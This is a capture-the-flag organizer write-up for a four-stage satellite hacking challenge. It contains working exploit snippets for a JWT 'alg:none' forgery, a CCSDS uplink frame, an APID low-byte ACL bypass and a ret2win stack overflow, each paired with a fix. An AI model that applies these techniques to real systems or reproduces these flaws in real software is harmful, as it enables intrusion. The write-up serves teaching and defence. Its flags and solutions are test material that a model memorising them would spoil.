# DESIGN / ORGANIZER WRITEUP — DEEP SAT EXPLOIT

Full solution and rationale. Spoilers throughout.

The challenge models the real trust chain of a space mission and breaks it at
every hop: **ground web → RF uplink → command router → flight app**. Each hop's
compromise is the credential for the next, so it plays as one escalating story
rather than four disconnected tasks. The finale is a memory-corruption *sandbox
escape* across the flight software's Software Bus — deliberately isomorphic to a
browser/OS IPC sandbox escape, which is where the "same structure, but it's a
satellite" idea comes from.

---

## Stage 1 — GROUND ZERO — Ground station: JWT `alg:none`

**Service:** `ground-station` (Flask), http://localhost:8080

The session cookie is a JWT. A public `guest/guest` account issues a real HS256
token `{"user":"guest","role":"viewer"}`. Operator features — the command uplink
console, the uplink auth key, and the firmware download — require
`role == "operator"`.

**Bug** ([`ground-station/app.py`](ground-station/app.py), `jwt_verify`): the
verifier accepts `alg: "none"` (unsigned) tokens in addition to HS256. The HMAC
secret is random per boot, so brute force is out; `alg:none` is the intended path.

**Exploit:** forge an unsigned token and set the cookie.

```python
import base64, json
b = lambda o: base64.urlsafe_b64encode(json.dumps(o).encode()).rstrip(b"=").decode()
tok = b({"alg":"none","typ":"JWT"}) + "." + b({"user":"admin","role":"operator"}) + "."
# Cookie: session=<tok>
```

The operator dashboard then reveals **FLAG1**, the **uplink key**
(`UPLINK-TC-2026`), the relay endpoint (`localhost:9010`), and a **firmware
download** (`/firmware`) — the exact `flight_sw` ELF you'll pwn in stage 3b.

**Fix:** pin the algorithm (`algorithms=["HS256"]`), reject `none`, use a strong
static secret or asymmetric keys.

---

## Stage 2 — SIGNAL PASS — Uplink relay: the visibility window

**Service:** `uplink-relay` (TCP), `localhost:9010`

The relay is the only bridge to the spacecraft. It models a LEO pass: a **15 s
AOS** window when commands are forwarded, then **45 s LOS** when everything is
dropped. Protocol is one line per command:

```
<UPLINK_KEY>:<hex CCSDS TC frame>\n
```

The relay validates the key, checks it's inside AOS, and validates the CCSDS TC
(type=telecommand, secondary-header present, XOR checksum). A well-formed,
correctly-timed, delivered telecommand returns **FLAG2**.

**CCSDS TC frame** (this CTF's teaching subset — see
[`ground-station/ccsds.py`](ground-station/ccsds.py)):

```
primary hdr (6B):  ver/type/secHdr/APID | seqFlags/seqCount | dataLen
secondary  (2B):  cmd_code | checksum(XOR of all other bytes)
payload    (N):   command args
```

A NOOP to the unrestricted `TO_APP` (APID `0x004`, cmd `0x00`) is enough:

```python
import ccsds
frame = ccsds.build_tc(apid=0x004, cmd_code=0x00)     # checksum auto-computed
# send "UPLINK-TC-2026:" + frame.hex() during AOS
```

The "ride the window" mechanic is what makes it feel like a real pass — you time
your uplink, and the reference exploit sleeps until AOS.

**Fix (conceptual):** the window is realism, not the bug; the real weakness is
that a leaked static uplink key authorizes commanding at all. Real missions use
authenticated command links (e.g. CCSDS SDLS) with rolling counters.

---

## Stage 3a — BUS HIJACK — Software Bus: ACL route confusion

**Service:** `flight-sw` (C OBC), reached through the relay.

cFS routes a command to an app by its **message id**, derived here from the full
**11-bit APID**. Apps are unrestricted (`HK_APP` `0x001`, `TO_APP` `0x004`) or
privileged (`CFE_ES` `0x201`, `SANDBOX_APP` `0x204`). Privileged apps must not be
commandable from a raw uplink.

**Bug** ([`flight-sw/flight_sw.c`](flight-sw/flight_sw.c), `route`): authorization
indexes the ACL with the **low byte** of the APID, while routing uses the full
APID:

```c
struct app_t *app = lookup(apid);       // full 11-bit APID
int authorized = acl[apid & 0xFF];      // <-- truncated to 8 bits
if (app->restricted && !authorized) { /* EPERM */ }
```

`acl[]` only opens the low bytes of unrestricted apps: `acl[0x01]` (HK) and
`acl[0x04]` (TO). A privileged app whose low byte collides is now reachable:

- `CFE_ES` APID `0x201` → `0x201 & 0xFF = 0x01` → looks like HK → **authorized**
- `SANDBOX_APP` APID `0x204` → `0x204 & 0xFF = 0x04` → looks like TO → **authorized**

Command `CFE_ES` (APID `0x201`) and it answers with **FLAG3A**. This is a pure
logic/parser-differential bug — the "easy" tier of the finale — and it's the
foothold that unlocks the memory-corruption app.

**Fix:** authorize on the full msgid (or the resolved app handle), never a
truncated index; keep the routing key and the authorization key identical.

---

## Stage 3b — OBC ESCAPE — OBC pwn: sandbox escape via stack overflow

Stage 3a proved you can command a privileged app. `SANDBOX_APP` (`0x204`) is one
of them, and it "runs" an uploaded ops script — by copying the command payload
into a fixed stack buffer:

```c
void sandbox_exec(const unsigned char *payload, uint16_t len) {
    char script[128];
    memcpy(script, payload, len);   // <-- no bound; len is attacker-controlled
    ...
}
```

The binary is built `-fno-stack-protector -no-pie` with symbols intact (you
downloaded it in stage 1), so this is a fair **ret2win**. The target is the core
flight-executive routine that only the boot path should ever reach:

```c
void cfe_es_privileged_exec(void) {   // "escape the app sandbox into the executive"
    // prints FLAG3B and POSTs a compromise event to the scoreboard -> GUI de-orbit
}
```

**Exploit** ([`solution/exploit.py`](solution/exploit.py)): resolve the win
address from the ELF `.symtab` and spray it over the saved return address so the
exact offset is irrelevant (every 8-byte-aligned slot holds the pointer):

```python
win = elf_symbol("flight_sw", "cfe_es_privileged_exec")
payload = struct.pack("<Q", win) * 64
frame   = ccsds.build_tc(apid=0x204, cmd_code=0x0A, payload=payload)
# uplink during AOS -> FLAG3B
```

When `cfe_es_privileged_exec` runs, the OBC POSTs
`/api/event/compromise` to the scoreboard and **SAT-1 de-orbits in the GUI**.

**Why "sandbox escape":** `SANDBOX_APP` is a restricted app whose stated policy
is "deny syscalls." By corrupting a Software-Bus-triggered call frame you
redirect execution into the privileged executive — crossing the app's trust
boundary exactly as an IPC message that escapes a renderer/OS sandbox does.

**Fix:** bounds-check the copy (`memcpy(script, payload, min(len, sizeof script))`),
compile with stack protector + PIE, and don't ship symbols.

---

## Full chain

```
alg=none JWT ─▶ operator ─▶ firmware + uplink key
     └─▶ ride 15s AOS ─▶ valid CCSDS TC (FLAG2)
             └─▶ APID 0x201 low-byte collision ─▶ CFE_ES (FLAG3A)
                     └─▶ APID 0x204 ─▶ memcpy overflow ─▶ ret2win (FLAG3B) ─▶ de-orbit
```

`solution/exploit.py` runs the whole thing end to end.

## Difficulty / flow notes

- Stage 2's flag is also appended to any delivered TC, so once players can uplink
  they have FLAG2 — it rewards *achieving a timed uplink*, not a separate puzzle.
- Stages 3a and 3b are the intended difficulty split ("both"): 3a is a pure logic
  bug reachable with a hand-built packet; 3b requires reversing the firmware and a
  classic ret2win. A team can bank FLAG3A without ever popping the OBC.
- Shorten `AOS_SECONDS`/`LOS_SECONDS` during testing; restore for the event.

## Threat-model talking points (for the debrief)

- **Trust-boundary collapse:** each layer trusts the layer above it implicitly —
  web session ⇒ command authority ⇒ bus routing ⇒ app memory safety.
- **Parser differentials** (the ACL truncation) are as dangerous in spacecraft
  command routers as in web stacks.
- **Memory safety on the OBC** is the last line; once it falls, "attitude control
  handed to the uplink" is not hyperbole — it's why the satellite falls.
